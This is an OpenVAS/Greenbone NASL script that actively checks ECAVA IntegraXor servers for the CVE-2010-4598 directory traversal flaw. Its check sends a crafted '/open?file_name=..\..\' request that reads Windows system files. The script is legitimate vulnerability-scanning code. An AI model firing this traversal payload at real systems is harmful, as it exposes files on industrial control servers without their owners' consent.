# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ecava:integraxor";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801496");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
  script_cve_id("CVE-2010-4598");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("ECAVA IntegraXor <= 3.6.4000.0 Directory Traversal Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_ecava_integraxor_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 7131);
  script_mandatory_keys("ecava/integraxor/http/detected");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15802/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45535");

  script_tag(name:"summary", value:"ECAVA IntegraXor is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to download
  files from the disk where the server is installed through directory traversal attacks.");

  script_tag(name:"insight", value:"The flaw is due to 'open' request, which can be used by an
  attacker to download files from the disk where the server is installed.");

  script_tag(name:"affected", value:"Ecava IntegraXor version 3.6.4000.0 and prior.");

  script_tag(name:"solution", value:"Update to version 3.6.4000.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files( "windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = dir + "/open?file_name=..\..\..\..\..\..\..\..\..\..\..\" + file;
  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( url:url, port:port );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
